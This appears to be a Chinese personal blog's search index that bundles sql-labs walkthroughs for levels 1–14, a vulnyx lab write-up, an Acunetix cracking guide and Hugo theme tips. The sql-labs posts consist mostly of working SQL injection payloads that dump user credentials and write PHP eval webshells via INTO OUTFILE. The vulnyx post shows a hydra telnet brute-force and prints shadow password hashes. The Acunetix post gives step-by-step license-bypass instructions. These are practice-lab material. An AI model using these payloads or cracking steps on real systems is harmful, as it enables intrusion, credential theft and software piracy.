","date":"2025-08-31T00:00:00Z","image":"http://localhost:1313/images/21.webp","permalink":"http://localhost:1313/p/%E6%B8%B8%E6%88%8Fcs2_cfg%E6%96%87%E4%BB%B6-%E4%B8%AA%E4%BA%BA%E4%BD%BF%E7%94%A8%E6%96%B9%E6%A1%88/","title":"【游戏】CS2_cfg文件-个人使用方案"},{"content":"Less-6 验证注入点：双引号报错，两个双引号闭合利用闭合方式：\u0026quot; \u0026lt;payload\u0026gt; --+\n就闭合方式和 Less-5 不一样外，其余都一样\n1.进入第六题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n发现闭合方式为\u0026quot;，和上一关同理采用报错注入，这里用extractvalue函数\n1 http://localhost/sqli-labs/Less-6/?id=1\u0026#34; 1 ?id=1\u0026#34; and extractvalue(1,concat(0x7e,(select concat(username,\u0026#39;:\u0026#39;,password) from users limit 0,1)))--+ Less-7 验证注入点：单引号报错，两个单引号闭合利用闭合方式：')) \u0026lt;payload\u0026gt; --+\n1 http://localhost/sqli-labs/Less-7/?id=1 前置知识:\n文件读写注入条件：\n在配置文件中设置\nsecure_file_priv=\u0026rsquo;\u0026rsquo;\n1 2 3 注： 1. Windows的配置文件在mysql下的my.ini 2. Linux的配置文件在/etc/conf 查看是否配置成功：\n1 show global variables like \u0026#39;%secure%\u0026#39;; php的配置文件php.ini关闭魔术引号\nmagic_quotes_gpc = Off 知道服务器的绝对路径 登录的账户具有root权限\n读取文件：\nload_file() 1 例：select load_file(\u0026#34;D:/password.txt\u0026#34;) # 读取D盘下的password.txt文件 写文件：\ninto outfile 路径\n实战\n1.判断闭合方式闭合方式\n利用报错信息判断闭合方式为\u0026rsquo;))\n1 http://localhost/sqli-labs/Less-7/?id=1 \u0026#39;)) --+ 利用文件读写注入写入木马：\n写入一句话木马：\n1 2 3 4 正常Payload:\u0026lt;?php eval($_POST[\u0026#39;pwd\u0026#39;]);?\u0026gt; 十六进制：0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e http://localhost/sqli-labs/Less-7/?id=-1\u0026#39;)) UNION SELECT 1,2,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e into outfile \u0026#39;C:\\\\phpstudy_pro\\\\WWW\\\\hack.php\u0026#39; --+ 连接地址：http://localhost/hack.php\n连接密码：pwd\nLess-8 \u0026lsquo;闭合 布尔盲注\n使用的注入语句和第五关的布尔盲注一样\n示例，判断长度：\n1 http://localhost/sqli-labs/Less-8/?id=1\u0026#39;and length((select database()))\u0026gt;7 --+ 写shell：\n1 http://localhost/sqli-labs/Less-8/?id=-1\u0026#39; UNION SELECT 1,2,0x3c3f706870206576616c28245f504f53545b27707764275d293b3f3e into outfile \u0026#39;C:\\\\phpstudy_pro\\\\WWW\\\\hack.php\u0026#39; --+ 链接成功。\nLess-9 基于GET单引号基于时间盲注\n如果当前数据库名字符长度大于1，则执行sleep函数使数据库执行延迟，否则则返回1。\n1 2 http://localhost/sqli-labs/Less-9/?id=1\u0026#39; and if(length(database())\u0026gt;1,sleep(5),1) --+ 延迟5秒 Less-10 基于GET双引号基于时间盲注\n与第9关差不多，只不过闭合方式变成双引号了\n1 2 http://localhost/sqli-labs/Less-10/?id=1\u0026#34; and if(length(database())\u0026gt;1,sleep(5),1) --+ 延迟5秒 Less-11 基于单引号的POST注入\n单引号测试：\n1 uname=admin\u0026#39; and 1=1 --+ \u0026amp;passwd=\u0026amp;submit=Submit 字段个数：\n1 2 3 uname=admin\u0026#39; order by 3 %23 \u0026amp;passwd=\u0026amp;submit=Submit //报错 uname=admin\u0026#39; order by 2 %23 \u0026amp;passwd=\u0026amp;submit=Submit //正常 说明有两个字段 查找回显位：\n1 uname=-admin\u0026#39; union select 1,2 %23 \u0026amp;passwd=\u0026amp;submit=Submit 爆库名：\n1 uname=-admin\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 \u0026amp;passwd=\u0026amp;submit=Submit 爆表名：\n1 uname=-admin\u0026#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() %23 \u0026amp;passwd=\u0026amp;submit=Submit 爆列名：\n1 uname=-admin\u0026#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;emails\u0026#39; %23 \u0026amp;passwd=\u0026amp;submit=Submit 爆信息：\n1 uname=-admin\u0026#39; union select 1,group_concat(concat_ws(\u0026#39;-\u0026#39;,id,email_id)) from emails %23 \u0026amp;passwd=\u0026amp;submit=Submit 写shell：\n1 uname=-admin\u0026#39; UNION SELECT 1,\u0026#39;\u0026lt;?php @eval($_POST[\u0026#34;v\u0026#34;]);?\u0026gt;\u0026#39; into outfile \u0026#34;D:\\\\phpStudy_pro\\\\WWW\\\\hack1.php\u0026#34; %23 \u0026amp;passwd=\u0026amp;submit=Submit 成功连接\nLess-12 跟11关差不多，但是使用的是双引号加括号进行闭合。\n1 uname=admin\u0026#34;) order by 2 --+\u0026amp;passwd=\u0026amp;submit=Submit 然后后面跟11关一样。\nLess-13 基于单引号加括号进行闭合，错误回显注入。和十二关一样。\n构建payload:\n1 uname=admin\u0026#39;\u0026amp;passwd=pass\u0026amp;submit=Submit 1 从返回结果（sql语法问题）可见本关的闭合是\u0026#39;) 使用\n1 2 3 uname=admin\u0026#39;) order by 2 --+\u0026amp;passwd=pass\u0026amp;submit=Submit uname=admin\u0026#39;) order by 3 --+\u0026amp;passwd=pass\u0026amp;submit=Submit 进行测试，发现可知查询结果有两列 使用union进行查询，发现没有回显。\n1 uname=admin\u0026#39;) union select 1,2 --+\u0026amp;passwd=pass\u0026amp;submit=Submit 看来这关要用报错注入了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #获取服务器上所有数据库的名称 uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),63,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库的所有表名称 uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;pikachu\u0026#39;),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;pikachu\u0026#39;),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库users表的所有列名称 uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;pikachu\u0026#39; and table_name=\u0026#39;users\u0026#39;),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库users表的username和password列的所有值 uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),63,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#39;) and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),94,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit 写webshell的payload:\n1 uname=ele\u0026#39;) or 1=1 limit 0,1 into outfile \u0026#39;C:/less13.php\u0026#39; lines terminated by 0x3c3f7068702061737365727428245f504f53545b6c65737331335d293b3f3e#\u0026amp;passwd=pass\u0026amp;submit=Submit Less-14 这关回显sql语法错误，并且闭合是\u0026quot;\n测试\n1 uname=admin\u0026#34;\u0026amp;passwd=pass\u0026amp;submit=Submit 和上一关一样，这关如果sql查询有值也不显示，所以还是用报错注入，图就不截了，和上一关差不多，跨库爆数据的所有payload如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #获取服务器上所有数据库的名称 uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(schema_name) from information_schema.schemata),63,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库的所有表名称 uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;pikachu\u0026#39;),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;pikachu\u0026#39;),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库users表的所有列名称 uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_schema=\u0026#39;pikachu\u0026#39; and table_name=\u0026#39;users\u0026#39;),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit #获取pikachu数据库users表的username和password列的所有值 uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),1,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),32,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),63,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit uname=ele\u0026#34; and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,\u0026#39;^\u0026#39;,password)) from pikachu.users),94,31),0x7e),1)#\u0026amp;passwd=pass\u0026amp;submit=Submit 写webshell的payload：\n1 uname=ele\u0026#34; or 1=1 limit 0,1 into outfile \u0026#39;C:/less14.php\u0026#39; lines terminated by 0x3C3F7068702061737365727428245F504F53545B6C65737331345D293B3F3E#\u0026amp;passwd=pass\u0026amp;submit=Submit 本关代码与上一关的区别也仅在于闭合不同了。\n","date":"2025-08-30T00:00:00Z","image":"http://localhost:1313/images/22.webp","permalink":"http://localhost:1313/p/%E9%9D%B6%E5%9C%BAsql-labs-less-6-14/","title":"【靶场】sql-labs-Less 6-14"},{"content":"简介 vulnyx是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，挑战的目标是获取操作系统的root权限和查看flag。\n部署方法 官网：https://vulnyx.com/\n1.在官网搜索你想要的镜像,然后下载\n2.下载好后解压得到.ova的文件，右击选择VMware进行打开\n3.在弹出的框中，选择存放的位置，然后点击导入\n4.最后等待导入完成，然后启动该虚拟机就可以了\n部署成功\n步骤 信息收集 这里我就不收集了，IP地址获取到了，如果在实战情况下还是需要确认一下的，直接fscan扫一边看一下：\n1 2 ./fscan.exe 192.168.198.137 -nobr -np nmap 192.168.30.45 -A -O -p 1-65535 这边使用fscan和nmap都扫描了一边发现开放了三个端口：\n1 2 3 22/tcp open ssh 23/tcp open telnet 80/tcp open http 这里进行尝试连接一下ssh，发现给出了一个账户：b.taylor\n22端口是不能爆破的。登录了一下发现是拒绝的。那就只能爆破23端口了。\n使用hydra进行爆破\n1 2 3 字典下载地址：https://github.com/dw0rsec/rockyou.txt hydra -l b.taylor -P /root/Desktop/Tools/rockyou.txt telnet://192.168.198.137 -V -I 账号密码：b.taylor/rockyou\n使用telnet进行登录即可：\nuser 1 ZWRjOWY1YzU1YWY4NzUwNTAzM2EyMGRkNDE5MzEzNjQK shadow提权 发现这个用户附加了shadow组\n可以查看一下权限\n1 2 id cat /etc/shadow 1 2 b.taylor:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20135:0:99999:7::: root:$y$j9T$du9sW7McN8WfjLKPRheP7/$pyE/4IrgDjurpaNzpdyxj8PYcOYyDksyYPG2rxEBxm4:20134:0:99999:7::: 然后直接修改密码即可。\n","date":"2025-08-30T00:00:00Z","image":"http://localhost:1313/images/23.webp","permalink":"http://localhost:1313/p/%E9%9D%B6%E5%9C%BAvulnyx%E9%9D%B6%E5%9C%BA-lower2/","title":"【靶场】vulnyx靶场-Lower2"},{"content":"前言： Acunetix Premium 是一种 Web 应用程序安全解决方案，用于管理多个网站、Web 应用程序和 API 的安全。集成功能允许您自动化 DevOps 和问题管理基础架构。\n更新内容： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 改进 添加正则表达式以增强对 Django 应用程序中堆栈跟踪泄露的检测 改进了对使用弱密钥签名的 JWT 的检测 为暴露的 nginx.conf 和 .htaccess 文件添加了新的安全检查，以增强漏洞检测 添加了 LDAP 注入检测 增加了对 PII（个人身份信息）泄露漏洞的检测 JSON 响应中数据库连接字符串的新检测，以提高敏感数据暴露覆盖率 扫描仪已更新，支持从 Linux 使用 NTLM 身份验证扫描目标 更新了秘密令牌检测以增加覆盖范围 更新了 JSON 字段中的 DB 连接检测 更新了 DeepScan 以提取更多道具 添加了新的检查来检测原型污染（服务器端） 更新了 dompurify 以检测更多漏洞 更新了基于 dom 漏洞的 iframe 注入检测 更新了 XPath 注入以获得更好的覆盖范围了 修复了 Cleo Harmony/VLTrader/LexiCom RCE 检测的误报问题 修正了“Scripts\\WebApps\\drupal_3.script”中的版本比较逻辑 安全检查 为弱 ViewState 密钥添加了新的安全检查 添加了新的检查以检测 PAN-OS XSS ( CVE-2025-0133 ) 添加了一项新检查，用于检测 Citrix NetScaler 内存泄露 (CitrixBleed 2) ( CVE-2025-5777 ) 漏洞数据库（VDB）版本升级至20250708 更新了开放重定向以增加覆盖范围 为 API 添加了 JWT 身份验证绕过 添加了 SAP NetWeaver Visual Composer 无限制文件上传 ( CVE-2025-31324 ) 增加了对 Craft CMS 远程代码执行 ( CVE-2025-32432 )的检测 添加了对缺失的 X-Content-Type-Options 标头的检查 检测 Craft CMS 远程代码执行漏洞 ( CVE-2025-32432 ) 下载： 1 2 3 通过网盘分享的文件：Acunetix-v25.5.250613157.zip.apk 链接: https://pan.baidu.com/s/18gN5FnJ6KedX8ej1giI7pw 提取码: sk4s --来自百度网盘超级会员v4的分享 记得删除.apk,然后直接解压zip文件即可。\n安装： Download Zip File, password is on our post\n建议： 安装完成后， 先登录一次账号在停止服务， 执行下面操作\n在安装工具之前， 添加到 hosts 文件中 C:\\Windows\\System32\\drivers\\etc\\hosts\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 127.0.0.1 erp.acunetix.com 127.0.0.1 erp.acunetix.com. ::1 erp.acunetix.com ::1 erp.acunetix.com. 127.0.0.1 discovery-service.invicti.com 127.0.0.1 discovery-service.invicti.com. ::1 discovery-service.invicti.com ::1 discovery-service.invicti.com. 127.0.0.1 cdn.pendo.io 127.0.0.1 cdn.pendo.io. ::1 cdn.pendo.io ::1 cdn.pendo.io. 127.0.0.1 bxss.me 127.0.0.1 bxss.me. ::1 bxss.me ::1 bxss.me. 127.0.0.1 jwtsigner.invicti.com 127.0.0.1 jwtsigner.invicti.com. ::1 jwtsigner.invicti.com ::1 jwtsigner.invicti.com. 127.0.0.1 sca.acunetix.com 127.0.0.1 sca.acunetix.com. ::1 sca.acunetix.com ::1 sca.acunetix.com. 192.178.49.174 telemetry.invicti.com 192.178.49.174 telemetry.invicti.com. 2607:f8b0:402a:80a::200e telemetry.invicti.com 2607:f8b0:402a:80a::200e telemetry.invicti.com. 安装后， 让我们停止它的服务调用服务工具:(使用菜单或打开任务管理器， 转到服务选项卡)\nAcunetix Acunetix Database\n管理员运行停止服务\n或者使用命令停止 1 2 net stop \u0026#34;Acunetix Supervisor\u0026#34; net stop \u0026#34;Acunetix Database\u0026#34; 替换文件 wvsc.exe\n1 C:\\Program Files (x86)\\Acunetix\\25.1.250204093 移动两个文件\nlicense_info.Json 文件和 wa_data.dat 文件到\nC:\\ProgramData\\Acunetix\\shared\\license 目录替换将 C:/ProgramData/Acunetix/shared/license/整个文件夹设置为只读\n安装完成后登录发现需要证书， 不能扫描， 先停止服务， 将 license 下文件全部删除， 复制license_info.Json 文件和 wa_data.dat 文件进去设置只读， 再次启动服务\nNow let\u0026rsquo;s restart acunetix:\n重启服务， 成功（再次启动 Acunetix 两个服务）\nAcunetix\nAcunetix Database\nNow login back to application, and you should be able to use it :)\nEnjoy（完成）\n","date":"2025-08-30T00:00:00Z","image":"http://localhost:1313/images/20.webp","permalink":"http://localhost:1313/p/%E5%B7%A5%E5%85%B7acunetix_25.5.250613157-%E7%A0%B4%E8%A7%A3-%E5%AE%89%E8%A3%85/","title":"【工具】acunetix_25.5.250613157 破解-安装"},{"content":"引言： 不修改之前一定要在markdown换两行才能在博文里换行，实在是太烦了。\n修改： 其实只要在 hugo.yaml （也就是config.yaml）里面对应的选项里添加： hardWraps: true\n1 2 3 4 markup: goldmark: renderer: hardWraps: true 即可！！！\n","date":"2025-08-29T00:00:00Z","image":"http://localhost:1313/images/18.webp","permalink":"http://localhost:1313/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%8F%96%E6%B6%88-markdown-%E4%B8%A5%E6%A0%BC%E6%8D%A2%E8%A1%8C/","title":"【Hugo】hugo-stack主题魔改-取消 markdown 严格换行"},{"content":"Less-1 验证注入点：单引号报错，两个单引号闭合利用闭合方式：' \u0026lt;payload\u0026gt; --+\n1.进入第一题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示正常\n1 http://localhost/sqli-labs/Less-1/?id=1 3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数id的值被单引号包裹\n1 http://localhost/sqli-labs/Less-1/?id=1\u0026#39; 4.构造?id=1' and '1'='1页面重新显示正常，由此判断出这题是单引号字符型注入\n1 http://localhost/sqli-labs/Less-1/?id=1\u0026#39; and \u0026#39;1\u0026#39;=\u0026#39;1 5.构造?id=1' order by 1 --+通过order by子句来判断该数据表的字段数，页面显示正常。\n1 http://localhost/sqli-labs/Less-1/?id=1\u0026#39; order by 1 --+ 构造?id=1' order by 4 --+页面显示错误信息，由此可知该表字段数为3\n1 http://localhost/sqli-labs/Less-1/?id=1\u0026#39; order by 4 --+ 6.构造?id=-1' union select 1,2,3 --+判断出回显点为该表的第二、三字段\n1 http://localhost/sqli-labs/Less-1/?id=-1\u0026#39; union select 1,2,3 --+ 7.构造?id=-1' union select 1,2,database() --+知道了数据库名为security\n1 http://localhost/sqli-labs/Less-1/?id=-1\u0026#39; union select 1,2,database() --+ 8.构造\n1 ?id=-1\u0026#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ 在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users\n9.构造\n1 http://localhost/sqli-labs/Less-1/?id=-1\u0026#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 在数据库information_schema中的columns里查找出数据库security中的users表的全部字段\n10.构造\n1 ?id=-1\u0026#39; union select 1,group_concat(username),group_concat(password) from users --+ 爆出所有的用户名和密码\nLess-2 验证注入点：单引号报错，不用闭合可执行 SQL语句利用闭合方式：\u0026lt;payload\u0026gt;\n与第一关基本一样，就 id 不用闭合\n1.进入第二题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示正常\n1 http://localhost/sqli-labs/Less-2/?id=1 3.接下来加个单引号，显示语句出错，根据报错信息可以得知是单引号影响了SQL语句的闭合，由此判断出这题是数字型注入\n1 http://localhost/sqli-labs/Less-2/?id=1\u0026#39; 4.构造?id=1 order by 3 --+通过order by子句来判断该数据表的字段数\n1 http://localhost/sqli-labs/Less-2/?id=1 order by 3 --+ ![[Pasted image 20250313162025.png]]\n构造?id=1 order by 4 --+页面报错，由此可知该表字段数为3\n1 http://localhost/sqli-labs/Less-2/?id=1 order by 4 --+ ![[Pasted image 20250313162128.png]]\n5.构造?id=-1 union select 1,2,3 --+判断出回显点为该表的第二、三字段\n1 http://localhost/sqli-labs/Less-2/?id=1 union select 1,2,3 --+ 6.构造?id=-1 union select 1,2,database() --+知道了数据库名为security\n1 http://localhost/sqli-labs/Less-2/?id=-1 union select 1,2,database() --+ 7.构造\n1 http://localhost/sqli-labs/Less-2/?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ 在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users\n8.构造\n1 ?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 在数据库information_schema中的columns里查找出数据库security中的users表的全部字段\n9.构造\n1 ?id=-1 union select 1,group_concat(username),group_concat(password) from users --+ 爆出所有的用户名和密码\nLess-3 验证注入点：单引号报错，两个单引号闭合利用闭合方式：') \u0026lt;payload\u0026gt; --+\n也是闭合符号不一样\n1.进入第三题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示正常。\n1 http://localhost/sqli-labs/Less-3/?id=1 ![[Pasted image 20250313163018.png]]\n3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数id的值被单引号和括号包裹\n1 http://localhost/sqli-labs/Less-3/?id=1\u0026#39; 4.构造?id=1') order by 3 --+通过order by子句来判断该数据表的字段数\n1 http://localhost/sqli-labs/Less-3/?id=1\u0026#39;) order by 3 --+ ![[Pasted image 20250313163156.png]]\n构造?id=1') order by 4 --+页面报错，由此可知该表字段数为3\n5.构造?id=-1') union select 1,2,3 --+判断出回显点为该表的第二、三字段\n1 http://localhost/sqli-labs/Less-3/?id=1\u0026#39;) union select 1,2,3 --+ ![[Pasted image 20250313163335.png]]\n6.构造?id=-1') union select 1,2,database() --+知道了数据库名为security\n1 http://localhost/sqli-labs/Less-3/?id=-1\u0026#39;) union select 1,2,database() --+ 7.构造\n1 http://localhost/sqli-labs/Less-3/?id=-1\u0026#39;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ 在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users\n8.构造\n1 ?id=-1\u0026#39;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 在数据库information_schema中的columns里查找出数据库security中的users表的全部字段\n![[Pasted image 20250313165309.png]]\n9.构造\n1 ?id=-1\u0026#39;) union select 1,group_concat(username),group_concat(password) from users --+ 爆出所有的用户名和密码\nLess-4 验证注入点：双引号报错，两个双引号闭合利用闭合方式：\u0026quot;) \u0026lt;payload\u0026gt; --+\n也是闭合符号不一样\n1.进入第四题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示正常\n3.接下来加个双引号，显示语句出错，根据报错信息可以得知参数id的值被双引号和括号包裹\n4.构造?id=1\u0026quot;) order by 3 --+通过order by子句来判断该数据表的字段数,页面显示正常\n构造?id=1\u0026quot;) order by 4 --+页面报错，由此可知该表字段数为3\n1 http://localhost/sqli-labs/Less-4/?id=1\u0026#34;) order by 3 --+ 5.构造?id=-1\u0026quot;) union select 1,2,3 --+判断出回显点为该表的第二、三字段\n6.构造?id=-1\u0026quot;) union select 1,2,database() --+知道了数据库名为security\n1 http://localhost/sqli-labs/Less-4/?id=-1\u0026#34;) union select 1,2,database() --+ ![[Pasted image 20250313170055.png]]\n7.构造\n1 ?id=-1\u0026#34;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=\u0026#39;security\u0026#39; --+ 在数据库information_schema中的tables表里查询出security数据库的表有：emails,referers,uagents,users\n8.构造\n1 ?id=-1\u0026#34;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=\u0026#39;users\u0026#39; --+ 在数据库information_schema中的columns里查找出数据库security中的users表的全部字段\n9.构造\n1 ?id=-1\u0026#34;) union select 1,group_concat(username),group_concat(password) from users --+ 爆出所有的用户名和密码\nLess-5 验证注入点：单引号报错，两个单引号闭合利用闭合方式：' \u0026lt;payload\u0026gt; --+\n考察点：报错注入\n1.进入第五题，显示Please input the ID as parameter with numeric value，告诉了我们参数为id\n2.构造?id=1,页面显示You are in...........，不再像前4题显示name和passwd\n1 http://localhost/sqli-labs/Less-5/?id=1 3.接下来加个单引号，显示语句出错，根据报错信息可以得知参数id的值被单引号包裹\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; 4.构造?id=1‘ order by 1 --+通过order by子句来判断该数据表的字段数，页面显示正常\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; order by 1 --+ 构造?id=1' order by 3 --+页面显示正常\n构造?id=1' order by 4 --+页面报错，由此可知该表字段数为3\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; order by 3 --+ 5.构造?id=-1' union select 1,2,3 --+判断回显点，结果发现行不通\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; union select 1,2,3 --+ 6.构造?id=1' and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --+发现可以进行盲注\n1 http://localhost/sqli-labs/Less-5/?id=1\u0026#39; and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) --+ 7.也可以使用length()来判断数据库名的长度\n1 http://192.168.58.128/sqli-labs/Less-5/?id=1\u0026#39;and length((select database()))\u0026gt;7 --+ ","date":"2025-08-29T00:00:00Z","image":"http://localhost:1313/images/19.webp","permalink":"http://localhost:1313/p/%E9%9D%B6%E5%9C%BAsql-labs-less1-5/","title":"【靶场】sql-labs-Less1-5"},{"content":"效果 修改 高度限制在 20em，并隐藏滚动条。\n增添到 ==/themes/hugo-theme-stack/assets/scss/partials/article.scss==\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 .article-content { .highlight { padding: var(--card-padding); pre { margin: initial; padding: var(--card-padding); margin: 0; width: auto; max-height: 20em; scrollbar-width: none; /* Firefox */ \u0026amp;::-webkit-scrollbar { display: none; /* Chrome Safari */ } } } } 修改完成！\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/17.webp","permalink":"http://localhost:1313/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%9B%BA%E5%AE%9A%E4%BB%A3%E7%A0%81%E5%9D%97%E9%AB%98%E5%BA%A6/","title":"【Hugo】hugo-stack主题魔改-固定代码块高度"},{"content":"最终效果： 自定义修改 修改位置：\\content\\categories\\标签名\\_index.md\nindex.md文件内容：\n1 2 3 4 5 6 7 8 9 --- title: \u0026#34;Web攻防\u0026#34; description: \u0026#34;介绍\u0026#34; slug: \u0026#34;Web攻防\u0026#34; image: \u0026#34;Web攻防.webp\u0026#34; style: background: \u0026#34;#2a9d8f\u0026#34; color: \u0026#34;#fff\u0026#34; --- 修改：\n1 2 3 style: background: \u0026#34;#2a9d8f\u0026#34; color: \u0026#34;#fff\u0026#34; 颜色如下，根据自己喜欢的颜色进行修改：\n风格定位 背景色（Background） 文字色（Color） 色值说明 清新自然 #264653 #ffffff 深青绿色背景 + 纯白文字，低饱和更显柔和 温柔治愈 #e76f51 #ffffff 暖橙色背景 + 纯白文字，适合温馨场景 高级极简 #1d3557 #f1faee 藏蓝色背景 + 米白文字，避免纯白刺眼 活力明亮 #ffb703 #212121 亮黄色背景 + 深灰文字，对比强烈不刺眼 复古优雅 #8b5a2b #f5f5f5 棕褐色背景 + 米白文字，自带复古质感 冷静专业 #3a86ff #ffffff 天蓝色背景 + 纯白文字，适合商务场景 森系柔和 #43aa8b #f9fafb 浅草绿背景 + 近白文字，自然不突兀 神秘高级 #2b2d42 #edf2f4 深灰蓝背景 + 浅灰文字，低调有质感 甜美清新 #ff6b6b #ffffff 浅粉色背景 + 纯白文字，适合女性向场景 沉稳大气 #0077b6 #ffffff 深海蓝背景 + 纯白文字，显专业且庄重 只需要修改：background和color就可以了。\n","date":"2025-08-28T00:00:00Z","image":"http://localhost:1313/images/11.webp","permalink":"http://localhost:1313/p/hugohugo-stack%E4%B8%BB%E9%A2%98%E9%AD%94%E6%94%B9-%E5%BD%92%E6%A1%A3%E6%A0%87%E7%AD%BE%E9%A2%9C%E8%89%B2%E8%87%AA%E5%AE%9A%E4%B9%89/","title":"【Hugo】hugo-stack主题魔改-归档标签颜色自定义"},{"content":"1. 漏洞概述 2020年12月29日，Nacos官⽅在github发布的issue中披露Alibaba Nacos 存在⼀个由于不当处理User-Agent导致的未授权访问漏洞 。通过该漏洞，攻击者可以进⾏任意操作，包括创建新⽤户并进⾏登录后操作。\n2. 影响版本 Nacos \u0026lt;= 2.0.0-ALPHA.1\n3. 环境搭建 